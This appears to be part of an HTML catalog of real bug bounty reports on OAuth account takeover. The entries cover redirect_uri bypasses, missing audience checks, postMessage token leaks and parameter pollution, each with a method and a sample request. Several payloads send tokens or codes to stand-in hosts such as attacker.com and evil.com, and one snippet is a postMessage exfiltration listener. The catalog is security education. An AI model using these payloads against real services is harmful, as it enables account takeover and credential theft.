+<div class="pre">https://login.gov/openid_connect/authorize?client_id=&lt;SP&gt;&amp;redirect_uri=https://agency.gov.attacker.com/cb&amp;response_type=code&amp;scope=openid&amp;state=...</div>
+<p class="insight"><b>Insight —</b> redirect_uri validation must be an EXACT match on scheme+host+path, not startsWith/contains on the hostname. Test with allowed.com.evil.com, allowed.com@evil.com, allowed.com.evil.com, sub.allowed.com, path traversal, and open-redirect chains on the allowed host.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/384289" target="_blank" rel="noopener">hackerone.com/reports/384289</a></span><a class="src" href="#report-384289" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec" id="report-314808" style="--sv:var(--sev-high)" data-sev="3" data-votes="409" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Social-login ATO: server accepts any app's access_token (audience not verified)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#314808</b> · reverb · awarded · 409 votes · resolved</div>
+<div class="taxo"><span>Program <b>reverb</b></span><span>Surface <b>api</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The /api/auth/facebook endpoint takes a Facebook access_token and logs the user in by the email/id it resolves to, without verifying the token was issued for this application (no /debug_token app_id check). Any valid FB token from a different app works.</p>
+<h4>Method</h4><ol><li>Obtain a Facebook access_token from any unrelated app</li><li>POST it to the target's facebook login endpoint</li><li>Server resolves the FB user and issues a session for the matching account</li></ol>
+<div class="pre">POST /api/auth/facebook HTTP/1.1
+Host: reverb.com
+
+{"fb_token":"&lt;ANY_APP_FB_ACCESS_TOKEN&gt;"}</div>
+<p class="insight"><b>Insight —</b> For any 'login with &lt;provider&gt; token' API, verify server-side audience validation: submit a token minted for a DIFFERENT client_id/app. If it authenticates, it's a mass ATO — provider tokens leak constantly. Same idea applies to Google id_token aud, Apple, etc.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/314808" target="_blank" rel="noopener">hackerone.com/reports/314808</a></span><a class="src" href="#report-314808" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec" id="report-202781" style="--sv:var(--sev-high)" data-sev="3" data-votes="426" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth token exfiltration by chaining redirect_uri wildcard + open redirects</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#202781</b> · uber · awarded · 426 votes · resolved</div>
+<div class="taxo"><span>Program <b>uber</b></span><span>Surface <b>web</b></span><span>Chain <b>FB OAuth wildcard redirect_uri -&gt; next_url open redirect </b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Facebook OAuth app allowed any redirect_uri matching https://auth.uber.com/login?* . That URL honored a next_url param, and login.uber.com/logout redirected based on the Referer header - chaining these hops walked the OAuth token out to an attacker site.</p>
+<h4>Method</h4><ol><li>Set FB OAuth redirect_uri to https://auth.uber.com/login?next_url=https://login.uber.com/logout</li><li>FB redirects to auth.uber.com which follows next_url to login.uber.com/logout</li><li>logout redirects per Referer to attacker site, delivering the token</li></ol>
+<div class="pre">redirect_uri = https://auth.uber.com/login?next_url=https://login.uber.com/logout
+# FB -&gt; auth.uber.com/login -&gt; login.uber.com/logout -&gt; (Referer) attacker.com#token</div>
+<p class="insight"><b>Insight —</b> A too-broad OAuth redirect_uri whitelist (prefix/wildcard) is only as safe as every redirect primitive on the allowed origin. Enumerate params like next_url/return_to and Referer-driven redirects on the whitelisted host to bounce the token off-origin.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/202781" target="_blank" rel="noopener">hackerone.com/reports/202781</a></span><a class="src" href="#report-202781" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec" id="report-110293" style="--sv:var(--sev-high)" data-sev="3" data-votes="276" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth callback-locking bypass via path-only callback_url + open redirect</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#110293</b> · x · awarded · 276 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>callback-lock bypass -&gt; *.twitter.com open redirect -&gt;</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Periscope's Twitter OAuth callback locking only checked the URL scheme, assuming callback_url is a full URI. Supplying just a PATH (e.g. a/../../login?redirect_after_login=...) passes the scheme check, and an open redirect on a *.twitter.com host walks the OAuth token to the attacker.</p>
+<h4>Method</h4><ol><li>Extract embedded consumer_key/secret from the mobile app</li><li>Generate a request token with a path-only callback_url that traverses to an open redirect</li><li>Open redirect (twitter.com/login?redirect_after_login=cards.twitter.com card with attacker fallback URL) sends token to attacker via fragment</li><li>Exchange stolen oauth_token for access_token; auto-authorize makes it interaction-less</li></ol>
+<div class="pre">callback_url = a/../../login?redirect_after_login=https://cards.twitter.com/&lt;card_id&gt;
+# card fallback -&gt; https://attacker.com#&amp;oauth_token=...</div>
+<p class="insight"><b>Insight —</b> OAuth callback validators that only check scheme/protocol can be defeated with relative/path-only callback values plus a same-site open redirect (ad cards, login redirect params). Token-in-fragment survives cross-host redirects.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/110293" target="_blank" rel="noopener">hackerone.com/reports/110293</a></span><a class="src" href="#report-110293" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec" id="report-922456" style="--sv:var(--sev-high)" data-sev="3" data-votes="257" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth email-verification gate bypass -&gt; ATO on relying parties</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#922456</b> · gitlab · awarded · 257 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>oauth</b></span><span>Chain <b>unverified GitLab email -&gt; replay authorize -&gt; RP trus</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">GitLab required a validated email before completing an OAuth grant, but the /oauth/authorize POST could be replayed directly to skip the gate. The issued token then carries an unverified email that relying parties trust as an identity, folding attacker and victim into one account.</p>
+<h4>Method</h4><ol><li>Seed victim: create Bitbucket/GitHub account with victimEmail, log into the target RP</li><li>In another browser create a GitLab account with the same email, never confirm it</li><li>Start 'Sign in with GitLab' on the RP; hit the 'validate your email' wall</li><li>Replay POST /oauth/authorize directly (with cookies/CSRF/state) to force the grant</li><li>Follow the 302 code to the RP and land in the victim's account</li></ol>
+<div class="pre">POST /oauth/authorize HTTP/1.1
+Host: gitlab.com
+Content-Type: application/x-www-form-urlencoded
+Cookie: [COOKIES]
+
+utf8=%E2%9C%93&amp;authenticity_token=[CSRF]&amp;client_id=&lt;RP_CLIENT&gt;&amp;redirect_uri=https%3A%2F%2Frp%2Fauth%2Fgitlab%2Fcallback&amp;state=[STATE]&amp;response_type=code&amp;scope=&amp;nonce=</div>
+<p class="insight"><b>Insight —</b> IdPs that assert an email must guarantee it is verified; RPs that key accounts on email inherit the IdP's verification gap. Test replaying the authorize endpoint to skip pre-grant checks, and pair an unverified-email IdP account with a victim email to take over any RP that merges by email. Also enables access to internal apps gated on @company.com.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/922456" target="_blank" rel="noopener">hackerone.com/reports/922456</a></span><a class="src" href="#report-922456" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec" id="report-1861974" style="--sv:var(--sev-high)" data-sev="3" data-votes="250" data-bounty="2000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Authorization code theft via path traversal in OAuth redirect_uri</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1861974</b> · pixiv · 2000 · 250 votes · resolved</div>
+<div class="taxo"><span>Program <b>pixiv</b></span><span>Surface <b>web</b></span><span>Chain <b>redirect_uri path traversal -&gt; code delivered to attacker</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">redirect_uri validation only prefix-checks the allowlisted callback path, so appending ../../ traverses to any page on the same trusted host; the authorization code is then delivered to an attacker-controlled page which leaks it via Google Analytics referrer/query capture.</p>
+<h4>Method</h4><ol><li>Attacker makes a public product page on the same trusted domain and enables their Google Analytics tracking ID</li><li>Craft an authorize URL with redirect_uri = &lt;allowed_callback&gt;/../../../../&lt;attacker_product_path&gt;</li><li>Victim clicks and completes login; browser is redirected to the attacker product page carrying ?code=</li><li>Attacker reads the code from GA real-time reports</li></ol>
+<div class="pre">https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=...&amp;redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/&lt;ATTACKER_PRODUCT_ID&gt;&amp;response_type=code&amp;scope=...&amp;state=x</div>
+<p class="insight"><b>Insight —</b> Test OAuth redirect_uri for path traversal (../), not just open-redirect: if validation only checks a path prefix on an allowed host, you can land the code on any same-host page you control content/analytics on. Any same-host reflected/analytics sink then leaks the code.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1861974" target="_blank" rel="noopener">hackerone.com/reports/1861974</a></span><a class="src" href="#report-1861974" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec" id="report-821896" style="--sv:var(--sev-high)" data-sev="3" data-votes="177" data-bounty="1200">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth token theft via postMessage targetOrigin control in response handler</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#821896</b> · playstation · 1200 · 177 votes · resolved</div>
+<div class="taxo"><span>Program <b>playstation</b></span><span>Surface <b>web</b></span><span>Chain <b>controlled targetOrigin -&gt; window.opener.postMessage toke</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">my.playstation.com/auth/response.html parses requestID and targetOrigin from the URL; setting requestID to start with 'window' selects window.opener.postMessage(response, targetOrigin) where targetOrigin is attacker-controlled, so the OAuth token in the URL is posted to the attacker's origin.</p>
+<h4>Method</h4><ol><li>Build the response.html URL with requestID=window_... and targetOrigin=https://attacker</li><li>Set it as redirect_uri (URL-encoded) on the Sony OAuth authorize endpoint with response_type=token&amp;prompt=none</li><li>Host a page that opens this flow; the popup posts the access token to the attacker origin</li></ol>
+<div class="pre">https://my.playstation.com/auth/response.html?requestID=window_request_&lt;uuid&gt;&amp;baseUrl=/&amp;targetOrigin=https://attacker.tld
+# used as redirect_uri on:
+https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;client_id=&lt;id&gt;&amp;redirect_uri=&lt;ENCODED_ABOVE&gt;&amp;prompt=none</div>
+<p class="insight"><b>Insight —</b> Audit OAuth 'postMessage bridge' pages: if either the message TARGET (targetOrigin) or the frame TYPE is taken from the URL, you can redirect the token to any origin. Grep the response handler JS for postMessage(*, variableFromUrl).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/821896" target="_blank" rel="noopener">hackerone.com/reports/821896</a></span><a class="src" href="#report-821896" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec" id="report-835437" style="--sv:var(--sev-high)" data-sev="3" data-votes="146" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Access-token smuggling via Referer header through chained open redirects</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#835437</b> · playstation · USD 1000 · 146 votes · resolved</div>
+<div class="taxo"><span>Program <b>playstation</b></span><span>Surface <b>web</b></span><span>Chain <b>loose redirect_uri validation + subdomain open redirect -&gt</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An OAuth response endpoint validates only the origin of redirect_uri, leaving the path/query attacker-controlled; chaining it to a same-parent-domain open redirect places the token-bearing URL in the Referer header sent cross-site.</p>
+<h4>Method</h4><ol><li>Find an auth response endpoint (my.playstation.com/auth/response.html) that only origin-validates the redirect target</li><li>Find an open redirect on an in-scope sibling subdomain (docs.playstation.com ...callback_url=)</li><li>Craft returnRoute so the token-carrying page navigates victim: my.playstation -&gt; docs.playstation open redirect -&gt; attacker</li><li>The Referer of the final hop to attacker.com contains the token/consumer_token from the earlier URL</li></ol>
+<div class="pre">https://my.playstation.com/auth/response.html?requestID=external_request_ID&amp;baseUrl=/&amp;targetOrigin=https://docs.playstation.com&amp;returnRoute=/consumers/auth/psn_oauth2?callback_url=https://attacker.com</div>
+<p class="insight"><b>Insight —</b> When redirect_uri is only origin-checked, the tail is yours: chain a subdomain open redirect and read the token out of the Referer header on the cross-site hop. Any secret placed in a URL leaks via Referer on the next navigation unless referrer-policy strips it.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/835437" target="_blank" rel="noopener">hackerone.com/reports/835437</a></span><a class="src" href="#report-835437" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec" id="report-206591" style="--sv:var(--sev-high)" data-sev="3" data-votes="142" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth state parameter used as redirect target -&gt; access-token theft</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#206591</b> · uber · awarded · 142 votes · resolved</div>
+<div class="taxo"><span>Program <b>uber</b></span><span>Surface <b>web</b></span><span>Chain <b>state-as-redirect -&gt; off-site redirect after login -&gt; </b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">For central.uber.com, the OAuth state parameter to login.uber.com carried a redirect location instead of an opaque CSRF token. An attacker poisons state with a central.uber.com path that redirects to a custom domain after login, exfiltrating the account OAuth access token.</p>
+<h4>Method</h4><ol><li>Start the central.uber.com OAuth login and observe state holds a redirect path, not a random token</li><li>Poison state with a central.uber.com path that ultimately redirects to attacker.com</li><li>Victim completes login; the access token is redirected to the attacker</li></ol>
+<div class="pre"># login.uber.com/authorize?...&amp;state=&lt;central.uber.com path that redirects off-site&gt;
+# post-login redirect delivers access token to attacker.com</div>
+<p class="insight"><b>Insight —</b> The OAuth state parameter must be an opaque anti-CSRF nonce, never a redirect URL. When state (or a return/next field) doubles as a post-login redirect, it becomes an open-redirect token-theft primitive. Always inspect what state actually contains.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/206591" target="_blank" rel="noopener">hackerone.com/reports/206591</a></span><a class="src" href="#report-206591" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec" id="report-1148364" style="--sv:var(--sev-high)" data-sev="3" data-votes="135" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Mint OAuth token for a victim by forcing an app 'trusted' via HPP</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1148364</b> · gitlab · awarded · 135 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>oauth</b></span><span>Chain <b>HPP trusted flag -&gt; auto-consent OAuth app -&gt; CSRF aut</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">GitLab group-level OAuth apps could be marked trusted (auto-authorized, admin-only feature) by HTTP-parameter-polluting the doorkeeper_application[trusted] field on the edit request. A trusted app skips the consent screen, defeating the authorization CSRF protection so a victim visiting the authorize link silently grants a code.</p>
+<h4>Method</h4><ol><li>Create a group and an OAuth application with api scope</li><li>Intercept 'Save application' and append doorkeeper_application[trusted]=0&amp;doorkeeper_application[trusted]=1 to force trusted=true</li><li>Send the victim the /login/oauth/authorize link (or embed in img)</li><li>Because the app is trusted, no consent is shown; capture the code and exchange it for the victim's access_token</li></ol>
+<div class="pre"># in the edit-application POST body, add:
+doorkeeper_application%5Btrusted%5D=0&amp;doorkeeper_application%5Btrusted%5D=1&amp;
+# then:
+GET /login/oauth/authorize?redirect_uri=http://attacker.com&amp;client_id=&lt;ID&gt;&amp;scope=api
+POST /login/oauth/access_token  code=&lt;CODE&gt;&amp;client_id=&lt;ID&gt;&amp;client_secret=&lt;SECRET&gt;</div>
+<p class="insight"><b>Insight —</b> Mass-assignment/HPP on privileged boolean flags (trusted, admin, verified, is_confidential) can unlock admin-only behavior. Duplicate-parameter (last-wins) tricks bypass server-side filtering of the field. A 'trusted' OAuth app removes the consent CSRF barrier - a silent token-minting primitive.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1148364" target="_blank" rel="noopener">hackerone.com/reports/1148364</a></span><a class="src" href="#report-1148364" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec" id="report-126522" style="--sv:var(--sev-high)" data-sev="3" data-votes="126" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Client/server parser differential: ';' as param delimiter to bypass host validation</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#126522</b> · x · awarded · 126 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>parser differential -&gt; attacker-controlled transfer host </b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Digits' server accepts both '&amp;' and ';' as query-param delimiters, but the client JS splits only on '&amp;'. So host=periscope.tv;@attacker.com is one param to the client (a full authority ...;@attacker.com) yet two params to the server (host=periscope.tv), passing server validation while the client sends the token to attacker.com.</p>
+<h4>Method</h4><ol><li>Identify a redirect/host value validated server-side but consumed client-side</li><li>Append ;@attacker.com (or ;host=attacker.com) to the trusted value</li><li>Server validates only the pre-';' portion; client parses the whole string and uses the attacker authority</li><li>OAuth credential data is transferred to attacker.com</li></ol>
+<div class="pre">https://www.digits.com/login?consumer_key=&lt;KEY&gt;&amp;host=https%3A%2F%2Fwww.periscope.tv;@attacker.com
+// server sees host=https://www.periscope.tv ; client authority becomes www.periscope.tv;@attacker.com</div>
+<p class="insight"><b>Insight —</b> Client and server rarely parse query strings identically. Test ';' as a delimiter, and the userinfo '@' trick (host;@evil / host@evil) to make validation and consumption disagree on the effective host. A general parser-differential class alongside HPP.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/126522" target="_blank" rel="noopener">hackerone.com/reports/126522</a></span><a class="src" href="#report-126522" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec" id="report-114169" style="--sv:var(--sev-high)" data-sev="3" data-votes="108" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth host validation bypass via HTTP Parameter Pollution</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#114169</b> · x · awarded · 108 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Chain <b>HPP host bypass -&gt; OAuth token delivered to attacker orig</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Digits validated the OAuth 'host' param against the app's registered domain, but with duplicate host params the validator checked the FIRST while the transfer step used the LAST. Supplying host=periscope.tv&amp;host=attacker.com passes validation yet delivers the token to attacker.com.</p>
+<h4>Method</h4><ol><li>Take the legitimate login URL with host=&lt;registered domain&gt;</li><li>Append a second host param pointing to attacker.com</li><li>Validation passes on the first host; the credential transfer uses the last host</li><li>Victim's OAuth data is sent to attacker.com</li></ol>
+<div class="pre">https://www.digits.com/login?consumer_key=&lt;KEY&gt;&amp;host=https%3A%2F%2Fwww.periscope.tv&amp;host=https%3A%2F%2Fattacker.com
+// validated: first host ; used: last host</div>
+<p class="insight"><b>Insight —</b> HTTP Parameter Pollution defeats validators that read a different occurrence of a duplicated param than the consumer does (first-validated / last-used, or vice versa). Always duplicate security-relevant params (host, redirect_uri, amount, role) and observe which copy each stage honors.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/114169" target="_blank" rel="noopener">hackerone.com/reports/114169</a></span><a class="src" href="#report-114169" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec" id="report-739321" style="--sv:var(--sev-high)" data-sev="3" data-votes="101" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth access-token impersonation (missing audience validation)</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#739321</b> · picsart · none · 101 votes · resolved</div>
+<div class="taxo"><span>Program <b>picsart</b></span><span>Surface <b>api</b></span><span>Chain <b>OAuth audience confusion -&gt; account takeover</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">App logs a user in using a social OAuth access_token without verifying the token was issued for its own client_id. A token minted for a different app (or a malicious app the same user authorized) is accepted, enabling account takeover.</p>
+<h4>Method</h4><ol><li>Register/control a second app that uses the same IdP (Facebook/Google) as the target</li><li>Get a victim who has authorized both the target and your app with the same social account</li><li>Collect the OAuth access_token issued to your app for that user</li><li>Submit that access_token to the target's social-login endpoint</li><li>Target accepts it and logs you into the victim's account</li></ol>
+<div class="pre">POST /auth/facebook\n{ "access_token": "&lt;token_issued_to_ATTACKER_app_for_VICTIM&gt;" }\n// accepted because server never calls the provider to confirm token.client_id == TARGET_client_id</div>
+<p class="insight"><b>Insight —</b> Whenever an app accepts a social/OAuth access_token for login, verify the token's audience/appId matches your own client_id via the provider's debug/token-info API. Test by feeding a token minted for a different client_id.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/739321" target="_blank" rel="noopener">hackerone.com/reports/739321</a></span><a class="src" href="#report-739321" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec" id="report-826394" style="--sv:var(--sev-high)" data-sev="3" data-votes="73" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth token leak via postMessage to window.opener with user-controlled targetOrigin=*</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#826394</b> · playstation · USD 1000 · 73 votes · resolved</div>
+<div class="taxo"><span>Program <b>playstation</b></span><span>Surface <b>web</b></span><span>Chain <b>token theft -&gt; account/resource access</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The auth response page derives the postMessage frame type and targetOrigin from attacker-controllable GET params (requestID prefix + targetOrigin); setting requestID to window_* and targetOrigin=* makes it post the access token to window.opener, i.e. the attacker page that opened it.</p>
+<h4>Method</h4><ol><li>window.open the OAuth authorize URL with redirect_uri's requestID set to 'window_...' and targetOrigin=*</li><li>If the victim is already logged in (prompt=none), the token is returned to /auth/response.html</li><li>That page calls window.opener.postMessage(tokenData, '*')</li><li>Attacker's onmessage handler on the opener receives the token</li></ol>
+<div class="pre">var x = window.open('https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&amp;...&amp;redirect_uri='+encodeURIComponent('https://my.playstation.com/auth/response.html?requestID=window_request_ID&amp;baseUrl=/&amp;targetOrigin=*')+'&amp;prompt=none');
+window.onmessage = e =&gt; exfil(JSON.stringify(e.data));</div>
+<p class="insight"><b>Insight —</b> When a postMessage target origin is taken from a URL param (or the frame type decides opener vs parent), an attacker can redirect the token to themselves. Always check that response/relay pages hardcode targetOrigin and validate the opener; treat requestID-style routing params as attacker input.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/826394" target="_blank" rel="noopener">hackerone.com/reports/826394</a></span><a class="src" href="#report-826394" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: token</a></div></article>
+<article class="spec" id="report-314814" style="--sv:var(--sev-high)" data-sev="3" data-votes="70" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth code theft via postMessage targetOrigin '*'</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#314814</b> · semrush · awarded · 70 votes · resolved</div>
+<div class="taxo"><span>Program <b>semrush</b></span><span>Surface <b>web</b></span><span>Chain <b>code leak -&gt; token exchange -&gt; victim data access; + c</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The oauth2/success page posts its location.href (containing the authorization code) to window.opener with targetOrigin '*' and no opener-origin check; any site that window.opens it can read the victim's code and exchange it for tokens.</p>
+<h4>Method</h4><ol><li>Attacker page window.open()s the OAuth authorize URL and registers a message listener</li><li>Victim (logged in) clicks Approve (or via clickjack)</li><li>success page posts {url: location.href with ?code=...} to opener with '*'</li><li>Attacker reads code, POST /oauth2/access_token with public client_id/secret -&gt; access+refresh token</li></ol>
+<div class="pre">var d=window.open('https://TARGET/oauth2/authorize?response_type=code&amp;client_id=seoquake&amp;redirect_uri=https%3A%2F%2FTARGET%2Foauth2%2Fsuccess&amp;state=...');
+window.addEventListener('message',e=&gt;alert(JSON.stringify(e.data)));
+// vulnerable success page: opener.postMessage({type:'...:oauth:success',url:location.href},'*')</div>
+<p class="insight"><b>Insight —</b> Audit OAuth success/redirect pages for opener.postMessage(...,'*'). If the code/token rides in the URL and is broadcast to any opener, window.open the flow from an attacker page and capture the message.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/314814" target="_blank" rel="noopener">hackerone.com/reports/314814</a></span><a class="src" href="#report-314814" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec" id="report-665651" style="--sv:var(--sev-high)" data-sev="3" data-votes="67" data-bounty="750">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth redirect_uri unvalidated -&gt; access token theft</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#665651</b> · gsa_bbp · 750 · 67 votes · resolved</div>
+<div class="taxo"><span>Program <b>gsa_bbp</b></span><span>Surface <b>web</b></span><span>Chain <b>open redirect on OAuth redirect_uri -&gt; token/code exfiltr</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Authorization endpoint accepts an arbitrary redirect_uri (and in a subdomain-whitelist variant, any subdomain), delivering the code/token to an attacker-controlled callback.</p>
+<h4>Method</h4><ol><li>Open /oauth/authorize with response_type=token and redirect_uri=https://evil.com/auth/callback</li><li>Victim authenticates with their account</li><li>Token/code is delivered to evil.com in the fragment/query =&gt; account takeover</li></ol>
+<div class="pre">https://login.fr.cloud.gov/oauth/authorize?client_id=CLIENT&amp;response_type=token&amp;redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&amp;state=STATE</div>
+<p class="insight"><b>Insight —</b> Always fuzz redirect_uri: full arbitrary host, then narrower bypasses (subdomain of a registered host, added path, @ userinfo). response_type=token leaks the token straight into the URL fragment. A too-broad subdomain whitelist still leaks the code if any subdomain is attacker-reachable (e.g. via subdomain takeover).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/665651" target="_blank" rel="noopener">hackerone.com/reports/665651</a></span><a class="src" href="#report-665651" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/oauth" target="_blank" rel="noopener">⚑ Lab: code</a></div></article>
+<article class="spec" id="report-850022" style="--sv:var(--sev-high)" data-sev="3" data-votes="44" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>OAuth authorize CSRF via .json/.xml suffix skipping token check</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#850022</b> · basecamp · awarded · 44 votes · resolved</div>
+<div class="taxo"><span>Program <b>basecamp</b></span><span>Surface <b>web</b></span><span>Chain <b>CSRF forced OAuth authorize -&gt; auth code -&gt; access tok</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The OAuth2 authorization POST enforces authenticity_token only on the bare path; requesting authorization.json (or .xml) skips the check, so a forged form silently authorizes the attacker's app and yields an auth code -&gt; full API access.</p>
